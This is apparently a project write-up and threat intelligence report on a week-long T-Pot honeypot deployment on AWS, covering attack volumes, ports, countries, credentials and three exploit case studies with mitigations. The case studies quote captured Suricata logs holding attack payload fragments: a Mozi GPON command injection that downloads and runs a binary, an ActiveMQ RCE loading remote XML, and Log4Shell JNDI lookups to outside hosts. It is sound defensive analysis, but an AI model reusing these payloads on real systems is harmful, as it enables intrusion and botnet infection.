
# AWS T-Pot Honeypot Deployment & Analysis 

**Deployed and analyzed a T-Pot honeypot within AWS to monitor, visualize, and report cyber threats, providing actionable insights into real-time attack patterns.**

![aws-honey](https://github.com/user-attachments/assets/1d0cf542-d1da-4d87-9de5-c673e25e30d9)


## Technologies Used
- AWS
- T-Pot Honeypot
- Threat Visualization


## Project Overview

**Status: Completed April 1, 2025**

This project involves deploying and configuring the T-Pot multi-honeypot platform on AWS cloud infrastructure. T-Pot is a comprehensive honeypot solution that offers 20+ honeypot types with extensive visualization options using the Elastic Stack, animated live attack maps, and security analysis tools.

![t-pot](https://github.com/user-attachments/assets/3aca46e4-10ef-4ccc-9e43-98e8a900bbc7)


## Technical Implementation

![t-pot-architecture](https://github.com/user-attachments/assets/6567eb86-2550-48c6-a9b9-4eb1b2133be8)


*T-Pot Multi-Honeypot Architecture*

### Honeypot Services
- **Cowrie**: SSH/Telnet honeypot for capturing brute force attacks and shell interactions
- **Dionaea**: Versatile honeypot for capturing malware
- **Glutton**: All-eating honeypot with high interaction capabilities
- **Honeytrap**: Advanced honeypot framework capturing attacks on various services
- **ADBHoney**: Android Debug Bridge honeypot

### Monitoring & Analytics
- **Elastic Stack**: For powerful log aggregation, search, and visualization
- **T-Pot Attack Map**: Real-time geographic visualization of attacks
- **Suricata**: Network security monitoring for advanced threat detection
- **CyberChef**: Web app for encryption, encoding, and data analysis

### Infrastructure
- **AWS EC2 Instance**: Meeting T-Pot's requirements of 8-16GB RAM and 128GB storage
- **Security Groups**: Configured to allow honeypot traffic while protecting management interfaces
- **Network Configuration**: Public-facing network interface with proper routing

## Project Goals

This project aims to:

1. Create a secure, isolated environment for capturing and analyzing cyber attacks  
2. Gather intelligence on current threat actors, techniques, and patterns  
3. Visualize attack data to identify trends and emerging threats  
4. Develop improved response procedures based on observed attack patterns  
5. Contribute anonymized data to security communities for broader threat analysis  

---

# Intelligence Report: AWS Honeypot Data Analysis

## 1. Introduction

I deployed a **T-Pot 24.04.1 honeypot** environment on AWS from **March 25 to April 1, 2025**. The objective was to capture real-world malicious traffic, analyze threat patterns (ports, countries, exploit attempts), and produce actionable insights for security stakeholders. Over the course of seven days, the honeypot logged more than **528,000 attacks** targeting multiple honeypot services, with Suricata providing in-depth alert data for critical vulnerabilities (Log4Shell, ActiveMQ RCE, Mozi IoT exploits, etc.).

## 2. Executive Summary

- **Dates**: March 25 – April 1, 2025 (7 days)  
- **Attacks Logged**: ~528k  
- **Top Honeypot**: Honeytrap (~299k hits)  
- **Primary Ports**: 445 (SMB), 9200 (Elasticsearch), 443 (HTTPS), 80 (HTTP), 22 (SSH)  
- **Leading Attacking Countries**: United States, Chile, Russia, China, Nigeria  
- **Notable Exploits**:
  - **Mozi** IoT botnet using GPON router exploits
  - **CVE-2023-46604** (Apache ActiveMQ RCE)
  - **CVE-2021-44228** (Log4Shell) attempts
- **Most Used Credentials**: username “root,” password “123456”

My findings confirm that unpatched systems remain heavily targeted, including older vulnerabilities (IoT routers, SMB) and newly disclosed RCEs. Log4Shell attempts persist long after its initial disclosure, highlighting the importance of continuous monitoring and patching.

## 3. Environment & Methodology

### 3.1 AWS T-Pot Setup

- **Platform**: T-Pot 24.04.1 on an AWS EC2 instance  
- **Honeypots**: Cowrie (SSH/Telnet), Dionaea (SMB, MSSQL), Honeytrap (dynamic ports), ElasticPot (Elasticsearch), H0neytr4p (HTTPS), etc.  
- **Suricata**: Monitors inbound/outbound traffic, flags known CVEs and suspicious behaviors  
- **Kibana & Elasticsearch**: Store and visualize large-scale event data  

All inbound ports below 64000 were open for maximum visibility. Logs were stored on a 256GB EBS volume to accommodate the high volume of data.

### 3.2 Data Collection

I utilized:

- **Kibana dashboards** (histograms, pie charts)  
- **Suricata eve.json** for raw alert data (CVE, signatures)  
- **Spiderfoot** for OSINT on interesting IP addresses (e.g., malicious reputation, blacklists)

## 4. Overall Attack Findings

### 4.1 Attack Volume Over Time

**528k total** in one week, with notable spikes on:

- **March 29** (~44k in 3 hours, large SMB spike)  
- **March 30–31** (30k+ bursts, likely botnet scanning)

![image](https://github.com/user-attachments/assets/1c312ff8-22de-4a7f-ab93-482b2f3d2707)

*Figure 1 – Attack Volume Histogram*

### 4.2 Honeypot Distribution

| Honeypot      | Hits      |
|---------------|----------:|
| **Honeytrap** | 299,334   |
| Dionaea       | 128,614   |
| Cowrie        | 39,567    |
| ElasticPot    | 19,189    |
| H0neytr4p     | 16,149    |
| Tanner        | 14,177    |
| ConPot        | 6,146     |
| Redishoneypot | 1,306     |
| Honeyaml      | 779       |
| Ciscoasa      | 773       |
| Mailoney      | 575       |
| Adbhoney      | 539       |
| Miniprint     | 404       |
| Sentrypeer    | 362       |
| Heralding     | 185       |


Honeytrap alone accounts for ~57% of total hits, capturing broad unknown-port scans. Dionaea and Cowrie remain popular targets for **SMB** and **SSH** exploitation.

![image](https://github.com/user-attachments/assets/fe0d247e-fe2f-45ba-939d-fce3ec9e319c)

*Figure 2 – Attacks by Honeypot*

### 4.3 Top Destination Ports

1. **445** (SMB) – Dominant worm-like scanning  
2. **9200** (Elasticsearch) – Known exploit attempts  
3. **443** (HTTPS) – Modest but persistent  
4. **80** (HTTP) – Brute-forcing, mass scans  
5. **22** (SSH) – Daily dictionary attacks

![image](https://github.com/user-attachments/assets/eed61569-77d3-4435-87ec-b2d2b3aec7ec)

*Figure 3 - Attacks by Destination Port*


### 4.4 Geographic & Reputation

- **United States** leads with 330k hits, many from AWS/GCP ranges  
- **Chile** at 78k from a single high-volume IP hitting SMB  
- **Russia**, **China**, **Nigeria** also prevalent  
- ~54k from **known attacker** IP addresses, 3k from anonymizers, ~2.6k mass scanners

![image](https://github.com/user-attachments/assets/c14b454a-b80e-447a-a126-b55efd31bc96)

*Figure 4 - Attacks by Country*


![image](https://github.com/user-attachments/assets/0874d4e5-5aeb-49bf-aba0-7aeba02f0361)

*Figure 5 - Attacker Src IP Reputation*

### 4.5 Suricata Alerts & CVEs

Frequent categories:

- **Attempted Administrator Privilege Gain**  
- **Misc Attack**  
- **Generic Protocol Command Decode**  
- **Attempted Information Leak**  

Critical vulnerabilities: **Mozi** IoT (GPON), **CVE-2023-46604** (ActiveMQ), **CVE-2021-44228** (Log4Shell).

## 5. Credential Brute Force

Most attempts targeted:

- **Username**: “root”  
- **Password**: “123456”

IP `155.93.101.10` was particularly active with “root/123456,” illustrating how default credentials remain a frequent infiltration vector.

![image](https://github.com/user-attachments/assets/dc0f4c80-2c33-4b90-90f0-033f160c2246)
*Figure 6 - Most attempted Usernames*

![image](https://github.com/user-attachments/assets/31e51d37-ef14-4dee-96ac-758e910efdc6)
*Figure 7 - Most attempted Passwords*


## 6. Detailed Exploit Case Studies

Below, I present three in-depth analyses of Suricata-flagged exploit attempts: **Mozi Botnet (IoT GPON)**, **CVE-2023-46604** (ActiveMQ RCE), and **CVE-2021-44228** (Log4Shell). Each deep dive includes the relevant Suricata event JSON, observations, background, impact, and recommended mitigations.

---

### 6.1 Mozi Botnet (IoT GPON Exploit)

#### 6.1.1 Suricata Event JSON

```json
{
  "@timestamp": "2025-03-26T03:50:11.928Z",
  "alert": {
    "signature": "ET EXPLOIT HackingTrio UA (Hello, World)",
    "cve_id": "CVE-2018-10562 CVE-2018-10561",
    "category": "Attempted Administrator Privilege Gain"
  },
  "src_ip": "221.225.231.101",
  "dest_port": 8080,
  "http.http_request_body_printable": "XWebPageName=diag&diag_action=ping... Mozi.m -O -> /tmp/gpon8;sh /tmp/gpon8",
  "geoip": {
    "country_name": "China",
    "as_org": "Chinanet"
  },
  "payload_printable": "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Hello, World\r\nContent-Length: 118\r\n\r\nXWebPageName=diag..."
}
```

#### 6.1.2 Observations

- **IP** `221.225.231.101` flagged in OSINT (abuse.ch, Maltiverse) as distributing **Mozi** malware.  
- Suricata recognized **CVE-2018-10561/10562** (GPON router RCE) references in the request body.  
- **Mozi** leverages peer-to-peer DHT for stealthy C2, typically brute-forcing IoT devices and blocking SSH/Telnet ports post-infection.

#### 6.1.3 Background

**Mozi** is an IoT botnet that soared in activity by exploiting older router vulnerabilities (GPON) or default credentials. It can run on MIPS or ARM-based devices, downloading binaries like `Mozi.m` to `/tmp/`.

#### 6.1.4 Impact on Honeypot

Though T-Pot isn’t actually a GPON device, the honeypot logs reveal ongoing attempts to **inject** malicious shell commands. Mozi’s success on real IoT gear results in large-scale P2P botnets used for DDoS or other attacks.

#### 6.1.5 Defensive Measures

- **Firmware Updates**: Patch IoT routers or disable remote management.  
- **Credentials**: Avoid defaults (root/admin).  
- **Egress Filtering**: Block suspicious outbound DHT or peer connections.  
- **IoT Isolation**: Keep consumer-grade router devices off production networks.

---

### 6.2 CVE-2023-46604 (Apache ActiveMQ RCE)

#### 6.2.1 Suricata Event JSON

```json
{
  "@timestamp": "2025-03-30T19:27:12.970Z",
  "alert": {
    "signature": "ET EXPLOIT Apache ActiveMQ Remote Code Execution Attempt (CVE-2023-46604)",
    "cve_id": "CVE-2023-46604 CVE-2023-46604 CVE-2023-46604",
    "category": "Attempted Administrator Privilege Gain"
  },
  "src_ip": "141.98.11.210",
  "dest_port": 61616,
  "payload_printable": "...Borg.springframework.context.support.ClassPathXmlApplicationContext...http://193.32.162.27/bins/o.xml",
  "geoip": {
    "country_name": "Lithuania",
    "as_org": "UAB Host Baltic"
  }
}
```

#### 6.2.2 Observations

- Attacker targets **port 61616**, default for **ActiveMQ**.  
- Suricata sees references to a **malicious .xml** used to load custom Spring beans (RCE).  
- IP from **UAB Host Baltic** in Lithuania, flagged for suspicious activity.

#### 6.2.3 Background

**CVE-2023-46604** is a remote code execution flaw in **Apache ActiveMQ**, where crafted HTTP/REST or STOMP messages can load untrusted Java classes. Attackers commonly place malicious `.xml` files on external hosts, forcing ActiveMQ to instantiate classes remotely.

#### 6.2.4 Impact on Honeypot

If a real ActiveMQ server were unpatched, the attacker gains **system-level** control. T-Pot’s capture shows how widely script-kiddies and botnets probe for new RCE vulnerabilities soon after disclosure.

#### 6.2.5 Defensive Measures

- **Upgrade** ActiveMQ to patched versions.  
- **Restrict** external access to port 61616.  
- **Monitor** suspicious `.xml` bean loads or unusual plugin usage.  
- Suricata or WAF rules to detect known exploit patterns.

---

### 6.3 CVE-2021-44228 (Log4Shell)

I witnessed repeated Log4Shell attempts over the entire honeypot run, demonstrating that, even long after it was publicly disclosed in December 2021, attackers still systematically test for vulnerable Log4j instances.

#### 6.3.1 Suricata Event JSON (Example 1)

```json
{
  "@timestamp": "2025-03-26T06:03:04.249Z",
  "alert": {
    "signature": "ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (CVE-2021-44228)",
    "cve_id": "CVE-2021-44228 CVE-2021-44228",
    "category": "Attempted Administrator Privilege Gain"
  },
  "src_ip": "67.211.213.61",
  "dest_port": 8002,
  "payload_printable": "GET /?id=${jndi:ldap://167.71.72.88:8066/TomcatBypass...} HTTP/1.1",
  "geoip": {
    "country_name": "United States",
    "as_org": "IS-AS-1"
  }
}
```

#### 6.3.2 Suricata Event JSON (Example 2)

```json
{
  "@timestamp": "2025-04-01T14:09:49.167Z",
  "alert": {
    "signature": "ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol TCP (CVE-2021-44228)",
    "cve_id": "CVE-2021-44228 CVE-2021-44228",
    "category": "Attempted Administrator Privilege Gain"
  },
  "src_ip": "104.154.219.182",
  "dest_port": 9200,
  "payload_printable": "GET /?x=${jndi:ldap://127.0.0.1#.${hostName}...} HTTP/1.1",
  "geoip": {
    "country_name": "United States",
    "as_org": "GOOGLE-CLOUD-PLATFORM"
  }
}
```

#### 6.3.3 Observations

- Attackers embed `jndi:ldap://...` lookups into HTTP headers (User-Agent, Referer, X-Forwarded-For).  
- They often manipulate **Elasticsearch** or generic HTTP ports, seeking unpatched Log4j libraries.  
- Multiple attempts from **Google Cloud** IPs underscore how scanning often originates from compromised or ephemeral VMs.

#### 6.3.4 Background

**CVE-2021-44228 (Log4Shell)** lets attackers achieve remote code execution by injecting malicious JNDI lookups into Log4j logging statements. It’s widely regarded as one of the most impactful vulnerabilities in recent years, with easy exploitability across many Java applications.

#### 6.3.5 Impact on Honeypot

Though the T-Pot environment does not run vulnerable Log4j by default, these attempts confirm how scanning scripts persist. Real unpatched servers remain prime targets, even more than a year post-disclosure.

#### 6.3.6 Defensive Measures

- **Upgrade** Log4j to 2.17+ or later  
- **Disable** JNDI lookups if patching is impossible  
- **Hunt** for suspicious LDAP/RMI callbacks in your network traffic  
- **Isolate** or firewall any server not needing inbound connections on these ports

---

## 7. Conclusions & Recommendations

### 7.1 Conclusions

My T-Pot honeypot data reveals:

1. **High-volume scanning** for classic SMB/SSH services, plus advanced IoT (Mozi) exploitation.  
2. **Ongoing RCE attempts** (ActiveMQ, Log4Shell) underscore how threat actors quickly add new CVEs while still hammering old vulnerabilities.  
3. **Default credentials** remain a critical weakness (SSH “root/123456”).  
4. **Cloud-based** scanning is ubiquitous—Google Cloud, AWS, and other providers frequently appear in logs.

### 7.2 Recommendations

1. **Patch Everything**: From Log4j to ActiveMQ, and especially IoT routers.  
2. **Harden Credentials**: Enforce strong SSH creds, or better yet, key-based authentication.  
3. **Segment & Filter**: Expose minimal services, deploy egress filtering to block malicious callbacks.  
4. **Monitor Suricata**: Keep rulesets updated for new CVEs, especially on commonly targeted ports like 445, 9200, 61616.  
5. **Aggressive OSINT**: Investigate repeated attacker IPs, possibly block at perimeter or alert on future hits.


## 8. References

- T-Pot 24.04.1: [GitHub Repository](https://github.com/telekom-security/tpotce)  
- CVE-2021-44228 (Log4Shell): [Apache Log4j Security](https://logging-log4j.staged.apache.org/log4j/2.x/security.html)  
- CVE-2023-46604 (ActiveMQ): [Apache Advisory](https://activemq.apache.org/security-advisories)  
- Mozi Botnet Analysis: [Microsoft](https://www.microsoft.com/en-us/security/blog/2021/08/19/how-to-proactively-defend-against-mozi-iot-botnet/)

